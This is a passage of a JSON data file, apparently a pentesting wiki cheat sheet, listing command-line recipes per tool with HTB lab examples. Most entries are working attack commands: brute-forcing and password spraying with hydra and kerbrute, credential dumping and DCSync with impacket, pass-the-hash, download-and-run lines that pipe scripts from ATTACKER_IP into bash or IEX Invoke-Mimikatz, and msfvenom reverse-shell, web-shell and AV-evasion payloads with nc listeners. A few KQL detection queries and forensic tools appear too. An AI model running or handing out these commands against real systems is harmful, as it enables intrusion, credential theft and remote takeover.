    "command": "ffuf -u http://TARGET -H \"Host: FUZZ.TARGET.com\" \\ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \\ -fs <default_response_size>",
    "tool": "shell",
    "lab": "ffuf",
    "lab_url": "",
    "source": "wiki",
    "desc": "Subdomain / VHost Fuzzing",
    "tags": "wiki shell ffuf"
  },
  {
    "command": "ffuf -u http://TARGET/login -X POST \\ -d \"username=admin&password=FUZZ\" \\ -w /usr/share/wordlists/rockyou.txt \\ -H \"Content-Type: application/x-www-form-urlencoded\" \\ -fc 401 ffuf -u http://TARGET/api/login -X POST \\ -d '{\"user\":\"admin\",\"pass\":\"FUZZ\"}' \\ -w passwords.txt \\ -H \"Content-Type: application/json\"",
    "tool": "shell",
    "lab": "ffuf",
    "lab_url": "",
    "source": "wiki",
    "desc": "POST Parameter Fuzzing",
    "tags": "wiki shell ffuf"
  },
  {
    "command": "ffuf -u http://TARGET/FUZZ -w wordlist.txt -t 100 ffuf -u http://TARGET/FUZZ -w wordlist.txt -p 0.1 ffuf -u http://TARGET/FUZZ -w wordlist.txt -rate 100",
    "tool": "shell",
    "lab": "ffuf",
    "lab_url": "",
    "source": "wiki",
    "desc": "Performance",
    "tags": "wiki shell ffuf"
  },
  {
    "command": "ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt \\ -u http://TARGET/index.php \\ -X POST -H \"Content-Type: application/x-www-form-urlencoded\" \\ -d \"username=FUZZ&password=invalid\" -fr \"Unknown user\" ffuf -w ./tokens.txt \\ -u http://TARGET/2fa.php \\ -X POST -H \"Content-Type: application/x-www-form-urlencoded\" \\ -b \"PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93\" \\ -d \"otp=FUZZ\" -fr \"Invalid 2FA Code\" ffuf -w /usr/share/wordlists/rockyou.txt \\ -u http://TARGET/login \\ -X POST -d \"username=admin&password=FUZZ\" \\ -H \"Content-Type: application/x-www-form-urlencoded\" \\ -fc 200   # success returns 302; show only non-200",
    "tool": "shell",
    "lab": "ffuf",
    "lab_url": "",
    "source": "wiki",
    "desc": "Authentication Testing",
    "tags": "wiki shell ffuf"
  },
  {
    "command": "ffuf -w /opt/SecLists/Discovery/Web-Content/common.txt \\ -u http://TARGET/index.php \\ -X POST -H \"Content-Type: application/x-www-form-urlencoded\" \\ -d \"server=http://internal.htb/FUZZ.php&date=2024-01-01\" \\ -fr \"Server at internal.htb Port 80\"",
    "tool": "shell",
    "lab": "ffuf",
    "lab_url": "",
    "source": "wiki",
    "desc": "SSRF Internal Endpoint Discovery",
    "tags": "wiki shell ffuf"
  },
  {
    "command": "pipx install git-dumper pip3 install git-dumper",
    "tool": "shell",
    "lab": "git-dumper",
    "lab_url": "",
    "source": "wiki",
    "desc": "Installation",
    "tags": "wiki shell git-dumper"
  },
  {
    "command": "git-dumper http://TARGET/.git/ ./output_dir git-dumper http://TARGET/ ./output_dir",
    "tool": "shell",
    "lab": "git-dumper",
    "lab_url": "",
    "source": "wiki",
    "desc": "Basic Usage",
    "tags": "wiki shell git-dumper"
  },
  {
    "command": "cd output_dir git log --oneline git log --all -p git log --all -p -S \"password\" git log --all -p -S \"secret\" git log --all -p -S \"token\" git log --all -p -S \"GITEA_ACCESS_TOKEN\" git log --all --full-history -- \"*\" git checkout <commit_hash> git stash       # return to latest",
    "tool": "shell",
    "lab": "git-dumper",
    "lab_url": "",
    "source": "wiki",
    "desc": "Post-Dump Analysis",
    "tags": "wiki shell git-dumper"
  },
  {
    "command": "git-dumper http://cat.htb/.git/ ./cat_source grep -r \"sql\\|query\\|SELECT\" cat_source/ grep -r \"cookie\\|session\" cat_source/ cd cat_source && git log --all -p -S \"password\"",
    "tool": "shell",
    "lab": "git-dumper",
    "lab_url": "",
    "source": "wiki",
    "desc": "Practical Workflow (HTB Cat)",
    "tags": "wiki shell git-dumper"
  },
  {
    "command": "git-dumper http://gitea.lock.htb/ellen.freeman/dev-scripts/.git/ ./dev-scripts git log --all -p -S \"GITEA_ACCESS_TOKEN\" curl -H \"Authorization: token PAT\" http://gitea.lock.htb/api/v1/repos/...",
    "tool": "shell",
    "lab": "git-dumper",
    "lab_url": "",
    "source": "wiki",
    "desc": "Practical Workflow (HTB Lock \u2014 PAT Exfil via CI/CD)",
    "tags": "wiki shell git-dumper"
  },
  {
    "command": "gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -o dirs.txt gobuster dir -u http://TARGET \\ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\ -x php,txt,html,bak,old,asp,aspx,jsp \\ -o dirs.txt gobuster dir -u http://TARGET -w wordlist.txt -U admin -P password gobuster dir -u http://TARGET -w wordlist.txt -c \"PHPSESSID=abc123\" gobuster dir -u http://TARGET -w wordlist.txt -H \"Authorization: Bearer TOKEN\" gobuster dir -u https://TARGET -w wordlist.txt -k gobuster dir -u http://TARGET -w wordlist.txt -r gobuster dir -u http://TARGET -w wordlist.txt -s \"200,301,302,403\" gobuster dir -u http://TARGET -w wordlist.txt -t 50 gobuster dir -u http://TARGET -w wordlist.txt --delay 100ms",
    "tool": "shell",
    "lab": "gobuster",
    "lab_url": "",
    "source": "wiki",
    "desc": "Directory Enumeration (dir mode)",
    "tags": "wiki shell gobuster"
  },
  {
    "command": "gobuster dns -d TARGET.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt gobuster dns -d TARGET.com -w subdomains.txt -i gobuster dns -d TARGET.com -w subdomains.txt -r 8.8.8.8",
    "tool": "shell",
    "lab": "gobuster",
    "lab_url": "",
    "source": "wiki",
    "desc": "Subdomain Enumeration (dns mode)",
    "tags": "wiki shell gobuster"
  },
  {
    "command": "gobuster vhost -u http://TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt gobuster vhost -u http://TARGET -w wordlist.txt --append-domain",
    "tool": "shell",
    "lab": "gobuster",
    "lab_url": "",
    "source": "wiki",
    "desc": "Virtual Host Enumeration (vhost mode)",
    "tags": "wiki shell gobuster"
  },
  {
    "command": "dig axfr @TARGET_IP domain.htb nmap --script dns-zone-transfer -p 53 TARGET_IP",
    "tool": "nmap",
    "lab": "gobuster",
    "lab_url": "",
    "source": "wiki",
    "desc": "When port 53 is open, attempt a DNS zone transfer first \u2014 it reveals all subdomains immediately without brute force:",
    "tags": "wiki nmap gobuster"
  },
  {
    "command": "hashcat -m <hash_type> <hash_file> <wordlist> [options]",
    "tool": "shell",
    "lab": "hashcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Core Syntax",
    "tags": "wiki shell hashcat"
  },
  {
    "command": "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt hashcat -m 1800 shadow.txt /usr/share/wordlists/rockyou.txt hashcat -m 1000 hashes.txt rockyou.txt --show",
    "tool": "shell",
    "lab": "hashcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Wordlist Attack (Most Common)",
    "tags": "wiki shell hashcat"
  },
  {
    "command": "hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule hashcat -m 1000 hashes.txt rockyou.txt -r rules/best64.rule -r rules/toggles1.rule",
    "tool": "shell",
    "lab": "hashcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Rules (Amplify Wordlist)",
    "tags": "wiki shell hashcat"
  },
  {
    "command": "hashcat -m 1000 hash.txt -a 3 ?l?l?l?l?l?l?l?l hashcat -m 1000 hash.txt -a 3 ?a?a?a?a?a?a?a?a hashcat -m 1000 hash.txt -a 6 rockyou.txt ?d?d?d?d",
    "tool": "shell",
    "lab": "hashcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Mask Attack (Brute Force Pattern)",
    "tags": "wiki shell hashcat"
  },
  {
    "command": "hashcat --identify hash.txt hashid HASH_VALUE hash-identifier",
    "tool": "shell",
    "lab": "hashcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Hash Identification",
    "tags": "wiki shell hashcat"
  },
  {
    "command": "hashcat -m 1000 hashes.txt rockyou.txt -d 1   # device 1 hashcat -I hashcat -b hashcat -m 1000 hashes.txt rockyou.txt -O hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule -O",
    "tool": "shell",
    "lab": "hashcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Performance Tips",
    "tags": "wiki shell hashcat"
  },
  {
    "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt john --format=NT hash.txt --wordlist=rockyou.txt         # NTLM john --format=sha512crypt shadow.txt --wordlist=rockyou.txt john --format=krb5tgs kerberoast.txt --wordlist=rockyou.txt unshadow /etc/passwd /etc/shadow > shadow_combined.txt john shadow_combined.txt --wordlist=rockyou.txt",
    "tool": "shell",
    "lab": "hashcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "John the Ripper (Alternative)",
    "tags": "wiki shell hashcat"
  },
  {
    "command": "hashcat -m 19700 aes_hashes.txt /usr/share/wordlists/rockyou.txt .\\Rubeus.exe kerberoast /tgtdeleg /user:targetuser /nowrap",
    "tool": "shell",
    "lab": "hashcat",
    "lab_url": "",
    "source": "wiki",
    "desc": "Modern AD environments enforce AES encryption (etype 18) on service accounts. If a target supports only AES, RC4 mode (-m 13100) won't work:",
    "tags": "wiki shell hashcat"
  },
  {
    "command": "hydra -l USER -P WORDLIST PROTOCOL://TARGET hydra -L USERLIST -P WORDLIST PROTOCOL://TARGET hydra -l USER -p SINGLE_PASS PROTOCOL://TARGET",
    "tool": "shell",
    "lab": "hydra",
    "lab_url": "",
    "source": "wiki",
    "desc": "Core Syntax",
    "tags": "wiki shell hydra"
  },
  {
    "command": "hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://TARGET hydra -L users.txt -P rockyou.txt ssh://TARGET -t 4   # reduce threads for SSH hydra -l user -P rockyou.txt ftp://TARGET hydra -l administrator -P rockyou.txt rdp://TARGET hydra -l administrator -P rockyou.txt smb://TARGET hydra -l administrator -P rockyou.txt TARGET -s 5985 winrm hydra -l admin -P rockyou.txt telnet://TARGET hydra -l admin@domain.com -P rockyou.txt smtp://TARGET hydra -l root -P rockyou.txt mysql://TARGET hydra -l sa -P rockyou.txt mssql://TARGET",
    "tool": "shell",
    "lab": "hydra",
    "lab_url": "",
    "source": "wiki",
    "desc": "Protocol Examples",
    "tags": "wiki shell hydra"
  },
  {
    "command": "hydra -l admin -P rockyou.txt TARGET http-get /admin/ hydra -l admin -P rockyou.txt TARGET \\ http-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid credentials\" hydra -l admin -P rockyou.txt -s 443 -S TARGET \\ https-post-form \"/login:username=^USER^&password=^PASS^:F=Login failed\" hydra -l admin -P rockyou.txt TARGET \\ http-post-form \"/login:user=^USER^&pass=^PASS^:S=Dashboard\" hydra -l admin -P rockyou.txt TARGET \\ http-post-form \"/admin/login:user=^USER^&pass=^PASS^:F=error:H=Cookie: session=abc123\"",
    "tool": "shell",
    "lab": "hydra",
    "lab_url": "",
    "source": "wiki",
    "desc": "HTTP Brute Force",
    "tags": "wiki shell hydra"
  },
  {
    "command": "hydra -L users.txt -p 'Password123!' smb://TARGET hydra -L users.txt -p 'Welcome1' ssh://TARGET -W 3",
    "tool": "shell",
    "lab": "hydra",
    "lab_url": "",
    "source": "wiki",
    "desc": "Password Spraying (Safe \u2014 Avoids Lockout)",
    "tags": "wiki shell hydra"
  },
  {
    "command": "impacket-psexec domain/user:pass@TARGET impacket-psexec -hashes :NTLM_HASH domain/admin@TARGET   # pass the hash impacket-wmiexec domain/user:pass@TARGET impacket-wmiexec -hashes :NTLM_HASH domain/admin@TARGET impacket-smbexec domain/user:pass@TARGET impacket-atexec domain/user:pass@TARGET \"whoami\" impacket-dcomexec domain/user:pass@TARGET \"cmd.exe\"",
    "tool": "shell",
    "lab": "impacket",
    "lab_url": "",
    "source": "wiki",
    "desc": "Remote Execution",
    "tags": "wiki shell impacket"
  },
  {
    "command": "impacket-secretsdump domain/admin:pass@TARGET impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL impacket-secretsdump -just-dc domain/admin:pass@DC_IP impacket-secretsdump -just-dc-ntlm domain/admin:pass@DC_IP",
    "tool": "shell",
    "lab": "impacket",
    "lab_url": "",
    "source": "wiki",
    "desc": "Credential Dumping",
    "tags": "wiki shell impacket"
  },
  {
    "command": "impacket-GetUserSPNs domain.com/user:pass -dc-ip DC_IP -request -outputfile kerberoast.txt impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt impacket-getTGT domain.com/user:pass -dc-ip DC_IP impacket-getST -spn cifs/TARGET.domain.com domain.com/user:pass",
    "tool": "shell",
    "lab": "impacket",
    "lab_url": "",
    "source": "wiki",
    "desc": "Kerberos Attacks",
    "tags": "wiki shell impacket"
  },
  {
    "command": "impacket-smbclient domain/user:pass@TARGET impacket-smbserver share . -smb2support impacket-smbserver share . -smb2support -username user -password pass",
    "tool": "shell",
    "lab": "impacket",
    "lab_url": "",
    "source": "wiki",
    "desc": "SMB Operations",
    "tags": "wiki shell impacket"
  },
  {
    "command": "impacket-mssqlclient user:pass@TARGET -windows-auth impacket-mssqlclient sa:pass@TARGET",
    "tool": "shell",
    "lab": "impacket",
    "lab_url": "",
    "source": "wiki",
    "desc": "MSSQL",
    "tags": "wiki shell impacket"
  },
  {
    "command": "impacket-findDelegation domain.com/user:pass -dc-ip DC_IP impacket-GetADUsers domain.com/user:pass -all -dc-ip DC_IP impacket-lookupsid domain/guest:@TARGET",
    "tool": "shell",
    "lab": "impacket",
    "lab_url": "",
    "source": "wiki",
    "desc": "LDAP / AD Enumeration",
    "tags": "wiki shell impacket"
  },
  {
    "command": "impacket-psexec -hashes LM:NT domain/admin@TARGET export KRB5CCNAME=admin.ccache impacket-psexec -k -no-pass domain/admin@TARGET",
    "tool": "shell",
    "lab": "impacket",
    "lab_url": "",
    "source": "wiki",
    "desc": "Pass the Hash / Pass the Ticket",
    "tags": "wiki shell impacket"
  },
  {
    "command": "impacket-secretsdump -just-dc DOMAIN/user:pass@DC_IP -outputfile dc_hashes impacket-secretsdump -just-dc-ntlm DOMAIN/user:pass@DC_IP impacket-secretsdump -just-dc-user administrator DOMAIN/user:pass@DC_IP impacket-secretsdump -just-dc DOMAIN/user:pass@DC_IP -pwd-last-set -user-status",
    "tool": "shell",
    "lab": "impacket",
    "lab_url": "",
    "source": "wiki",
    "desc": "DCSync \u2014 Extended Flags",
    "tags": "wiki shell impacket"
  },
  {
    "command": "pypykatz lsa minidump lsass.dmp impacket-smbserver share . -smb2support",
    "tool": "shell",
    "lab": "impacket",
    "lab_url": "",
    "source": "wiki",
    "desc": "LSASS Dump Analysis",
    "tags": "wiki shell impacket"
  },
  {
    "command": "impacket-psexec  -hashes :NTLM_HASH DOMAIN/admin@TARGET impacket-wmiexec -hashes :NTLM_HASH DOMAIN/admin@TARGET   # stealthier impacket-smbexec -hashes :NTLM_HASH DOMAIN/admin@TARGET   # no binary dropped impacket-atexec  -hashes :NTLM_HASH DOMAIN/admin@TARGET \"whoami\"",
    "tool": "shell",
    "lab": "impacket",
    "lab_url": "",
    "source": "wiki",
    "desc": "Pass the Hash \u2014 All Exec Methods",
    "tags": "wiki shell impacket"
  },
  {
    "command": "kape.exe --tsource C:\\ --tdest C:\\Triage\\Output --target !BasicCollection kape.exe --msource C:\\Triage\\Output --mdest C:\\Triage\\Processed --module !EZParser kape.exe --tsource C:\\ --tdest C:\\Triage\\Output --target !BasicCollection ^ --module !EZParser --mdest C:\\Triage\\Processed kape.exe --tsource E:\\ --tdest C:\\Triage\\Output --target !BasicCollection",
    "tool": "powershell",
    "lab": "kape",
    "lab_url": "",
    "source": "wiki",
    "desc": "Common CLI Usage",
    "tags": "wiki powershell kape"
  },
  {
    "command": "wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 chmod +x kerbrute_linux_amd64 sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute go install github.com/ropnop/kerbrute@latest",
    "tool": "shell",
    "lab": "kerbrute",
    "lab_url": "",
    "source": "wiki",
    "desc": "Installation",
    "tags": "wiki shell kerbrute"
  },
  {
    "command": "kerbrute userenum --dc DC_IP -d domain.htb users.txt kerbrute userenum --dc DC_IP -d domain.htb users.txt -o valid_users.txt",
    "tool": "shell",
    "lab": "kerbrute",
    "lab_url": "",
    "source": "wiki",
    "desc": "User Enumeration",
    "tags": "wiki shell kerbrute"
  },
  {
    "command": "kerbrute passwordspray --dc DC_IP -d domain.htb users.txt 'Password123!' kerbrute passwordspray --dc DC_IP -d domain.htb valid_users.txt 'Welcome2024!'",
    "tool": "shell",
    "lab": "kerbrute",
    "lab_url": "",
    "source": "wiki",
    "desc": "Password Spray",
    "tags": "wiki shell kerbrute"
  },
  {
    "command": "kerbrute bruteuser --dc DC_IP -d domain.htb passwords.txt username",
    "tool": "shell",
    "lab": "kerbrute",
    "lab_url": "",
    "source": "wiki",
    "desc": "Brute Force",
    "tags": "wiki shell kerbrute"
  },
  {
    "command": "kerbrute userenum --dc DC_IP -d domain.htb users.txt -o valid_users.txt impacket-GetNPUsers domain.htb/ -usersfile valid_users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt",
    "tool": "shell",
    "lab": "kerbrute",
    "lab_url": "",
    "source": "wiki",
    "desc": "Kerbrute userenum identifies accounts with Kerberos pre-auth disabled (these return a valid AS-REP). These are AS-REP roastable \u2014 collect with impacket-GetNPUsers after confirming via kerbrute:",
    "tags": "wiki shell kerbrute"
  },
  {
    "command": "cat employees.txt | awk '{print tolower($1\".\"$2)}' > users.txt kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local users.txt",
    "tool": "shell",
    "lab": "kerbrute",
    "lab_url": "",
    "source": "wiki",
    "desc": "Practical Workflow (HTB Sauna)",
    "tags": "wiki shell kerbrute"
  },
  {
    "command": "kerbrute userenum --dc 10.10.11.X -d retro.htb \\ /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt kerbrute passwordspray --dc 10.10.11.X -d retro.htb \\ valid_users.txt 'Training123!'",
    "tool": "shell",
    "lab": "kerbrute",
    "lab_url": "",
    "source": "wiki",
    "desc": "Practical Workflow (HTB Retro)",
    "tags": "wiki shell kerbrute"
  },
  {
    "command": "// Basic table query (last 24h by default in Sentinel) SecurityEvent | where EventID == 4625 // Time filter SecurityEvent | where TimeGenerated > ago(24h) // Field filter SecurityEvent | where EventID == 4624 and LogonType == 3 // Count events SecurityEvent | where EventID == 4625 | summarize count() by Account // Sort SecurityEvent | summarize count() by Account | order by count_ desc // Project specific columns SecurityEvent | project TimeGenerated, Account, IpAddress, Activity // String operations SecurityEvent | where CommandLine contains \"powershell\" | where CommandLine contains_cs \"-enc\"   // case-sensitive // Regex SecurityEvent | where CommandLine matches regex @\"(?i)-enc\\s+[A-Za-z0-9+/=]+\" // Parse fields SecurityEvent | extend parsed = parse_json(ExtendedProperties)",
    "tool": "kql",
    "lab": "kql",
    "lab_url": "",
    "source": "wiki",
    "desc": "KQL Fundamentals",
    "tags": "wiki kql kql"
  },
  {
    "command": "// PowerShell encoded commands (Sentinel) SecurityEvent | where EventID == 4104 | where ScriptBlockText contains \"-enc\" or ScriptBlockText contains \"EncodedCommand\" | project TimeGenerated, Computer, ScriptBlockText // Suspicious process creation (MDE) DeviceProcessEvents | where FileName in~ (\"mimikatz.exe\", \"procdump.exe\", \"psexec.exe\") | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine // DCSync detection (Sentinel) SecurityEvent | where EventID == 4662 | where Properties contains \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\"   // Replication GUID | project TimeGenerated, SubjectAccount, ObjectName // Impossible travel (Azure AD) SigninLogs | where ResultType == 0 | project TimeGenerated, UserPrincipalName, Location, IPAddress | order by UserPrincipalName, TimeGenerated // Failed login threshold SecurityEvent | where EventID == 4625 | summarize FailCount=count() by Account, bin(TimeGenerated, 10m) | where FailCount > 5",
    "tool": "kql",
    "lab": "kql",
    "lab_url": "",
    "source": "wiki",
    "desc": "Threat Hunting Queries",
    "tags": "wiki kql kql"
  },
  {
    "command": "curl http://ATTACKER_IP/linpeas.sh | bash wget -O- http://ATTACKER_IP/linpeas.sh | bash wget http://ATTACKER_IP/linpeas.sh -O /tmp/linpeas.sh chmod +x /tmp/linpeas.sh /tmp/linpeas.sh cd /dev/shm && curl -O http://ATTACKER_IP/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh",
    "tool": "shell",
    "lab": "linpeas",
    "lab_url": "",
    "source": "wiki",
    "desc": "Delivery Methods",
    "tags": "wiki shell linpeas"
  },
  {
    "command": "./linpeas.sh ./linpeas.sh -s          # superfast (skip time-consuming checks) ./linpeas.sh -a          # all checks (slow but thorough) ./linpeas.sh | tee /tmp/linpeas_out.txt ./linpeas.sh -q",
    "tool": "shell",
    "lab": "linpeas",
    "lab_url": "",
    "source": "wiki",
    "desc": "Useful Flags",
    "tags": "wiki shell linpeas"
  },
  {
    "command": "sudo -l                                              # sudo rights \u2192 GTFOBins find / -perm -4000 -type f 2>/dev/null               # SUID binaries find / -perm -2000 -type f 2>/dev/null               # SGID binaries getcap -r / 2>/dev/null                              # capabilities crontab -l; cat /etc/crontab; ls /etc/cron*          # cron jobs cat /etc/exports                                     # NFS no_root_squash find / -writable -type f 2>/dev/null                 # writable files uname -a                                             # kernel version grep -rli 'password' /home/ /var/www/ /opt/ 2>/dev/null  # passwords in files find / -name id_rsa 2>/dev/null                      # private SSH keys ss -tulnp                                            # internal services",
    "tool": "shell",
    "lab": "linpeas",
    "lab_url": "",
    "source": "wiki",
    "desc": "Manual Priority Checks (Without LinPEAS)",
    "tags": "wiki shell linpeas"
  },
  {
    "command": "certutil -urlcache -f http://ATTACKER_IP/winPEASany.exe C:\\temp\\winpeas.exe (New-Object Net.WebClient).DownloadFile('http://ATTACKER/winPEASany.exe','C:\\temp\\winpeas.exe') Invoke-WebRequest -Uri http://ATTACKER/winPEASany.exe -OutFile C:\\temp\\winpeas.exe upload /local/winpeas.exe",
    "tool": "powershell",
    "lab": "linpeas",
    "lab_url": "",
    "source": "wiki",
    "desc": "Delivery",
    "tags": "wiki powershell linpeas"
  },
  {
    "command": ".\\winPEASany.exe .\\winPEASany.exe systeminfo .\\winPEASany.exe userinfo .\\winPEASany.exe servicesinfo .\\winPEASany.exe applicationsinfo .\\winPEASany.exe networkinfo .\\winPEASany.exe windowscreds .\\winPEASany.exe quiet .\\winPEASany.exe > C:\\temp\\out.txt",
    "tool": "powershell",
    "lab": "linpeas",
    "lab_url": "",
    "source": "wiki",
    "desc": "Running WinPEAS",
    "tags": "wiki powershell linpeas"
  },
  {
    "command": "whoami /priv                                        # token privileges whoami /all                                         # user + groups + privs systeminfo                                          # patch level reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\"  # unquoted paths icacls \"C:\\path\\to\\service.exe\"                     # service binary permissions schtasks /query /fo LIST /v | findstr /i \"task\\|run\\|status\" cmdkey /list                                        # stored credentials reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\  # service configs dir /s /b C:\\*pass*.txt C:\\*cred*.txt 2>nul        # credential files",
    "tool": "powershell",
    "lab": "linpeas",
    "lab_url": "",
    "source": "wiki",
    "desc": "Manual Priority Checks (Without WinPEAS)",
    "tags": "wiki powershell linpeas"
  },
  {
    "command": "getcap -r / 2>/dev/null tac /root/root.txt    # 'tac' = reverse cat, same data",
    "tool": "shell",
    "lab": "linpeas",
    "lab_url": "",
    "source": "wiki",
    "desc": "LinPEAS flags capabilities in its output. Key dangerous capabilities:",
    "tags": "wiki shell linpeas"
  },
  {
    "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
    "tool": "powershell",
    "lab": "linpeas",
    "lab_url": "",
    "source": "wiki",
    "desc": "One of WinPEAS's highest-value findings on Windows:",
    "tags": "wiki powershell linpeas"
  },
  {
    "command": "MFTECmd.exe -f \"C:\\KapeOutput\\$MFT\" --csv \"C:\\Output\\\" --csvf mft_output.csv MFTECmd.exe -f \"C:\\KapeOutput\\$MFT\" --body \"C:\\Output\\\" --bodyf mft.body --bdl C",
    "tool": "shell",
    "lab": "mftecmd",
    "lab_url": "",
    "source": "wiki",
    "desc": "Common Command Syntax",
    "tags": "wiki shell mftecmd"
  },
  {
    "command": "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-Mimikatz.ps1') Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"' crackmapexec smb TARGET -u admin -p pass -M mimikatz",
    "tool": "powershell",
    "lab": "mimikatz",
    "lab_url": "",
    "source": "wiki",
    "desc": "Running Without Dropping to Disk",
    "tags": "wiki powershell mimikatz"
  },
  {
    "command": "from pymisp import PyMISP misp = PyMISP('https://misp.example.com', 'api_key') results = misp.search(value='192.168.1.1', type_attribute='ip-dst') results = misp.search(galaxy_name='IcedID') event = misp.new_event(distribution=1, threat_level_id=2, analysis=1, info='New IcedID campaign') misp.add_attribute(event['Event']['id'], {'type': 'domain', 'value': 'evil.example.com'})",
    "tool": "python",
    "lab": "misp",
    "lab_url": "",
    "source": "wiki",
    "desc": "MISP REST API (Common Queries)",
    "tags": "wiki python misp"
  },
  {
    "command": "msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -f <format> -o <output_file>",
    "tool": "shell",
    "lab": "msfvenom",
    "lab_url": "",
    "source": "wiki",
    "desc": "Core Syntax",
    "tags": "wiki shell msfvenom"
  },
  {
    "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf chmod +x shell.elf msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell32.elf msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf",
    "tool": "shell",
    "lab": "msfvenom",
    "lab_url": "",
    "source": "wiki",
    "desc": "Linux Payloads",
    "tags": "wiki shell msfvenom"
  },
  {
    "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell32.exe msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o evil.dll msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o shell.msi msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe-service -o svc.exe",
    "tool": "shell",
    "lab": "msfvenom",
    "lab_url": "",
    "source": "wiki",
    "desc": "Windows Payloads",
    "tags": "wiki shell msfvenom"
  },
  {
    "command": "msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw > shell.php msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f asp -o shell.asp msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f aspx -o shell.aspx msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.jsp msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war",
    "tool": "shell",
    "lab": "msfvenom",
    "lab_url": "",
    "source": "wiki",
    "desc": "Web Shells",
    "tags": "wiki shell msfvenom"
  },
  {
    "command": "msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f hta-psh -o shell.hta msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f vba -o macro.vba msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f psh -o shell.ps1",
    "tool": "powershell",
    "lab": "msfvenom",
    "lab_url": "",
    "source": "wiki",
    "desc": "Client-Side Payloads",
    "tags": "wiki powershell msfvenom"
  },
  {
    "command": "msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -b \"\\x00\\x0a\\x0d\" -f python",
    "tool": "shell",
    "lab": "msfvenom",
    "lab_url": "",
    "source": "wiki",
    "desc": "Encoding (AV Evasion \u2014 Limited Effectiveness)",
    "tags": "wiki shell msfvenom"
  },
  {
    "command": "msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -b \"\\x00\" -f python msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -b \"\\x00\" -f c",
    "tool": "shell",
    "lab": "msfvenom",
    "lab_url": "",
    "source": "wiki",
    "desc": "Buffer Overflow Shellcode",
    "tags": "wiki shell msfvenom"
  },
  {
    "command": "msfvenom --list payloads msfvenom --list payloads | grep windows/x64 msfvenom --list payloads | grep linux/x64 msfvenom --list formats",
    "tool": "shell",
    "lab": "msfvenom",
    "lab_url": "",
    "source": "wiki",
    "desc": "List Payloads",
    "tags": "wiki shell msfvenom"
  },
  {
    "command": "nc -lvnp 4444 rlwrap nc -lvnp 4444   # Windows shells msfconsole -q -x \"use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST IP; set LPORT 4444; run\"",
    "tool": "shell",
    "lab": "msfvenom",
    "lab_url": "",
    "source": "wiki",
    "desc": "Catching Shells",
    "tags": "wiki shell msfvenom"
  },
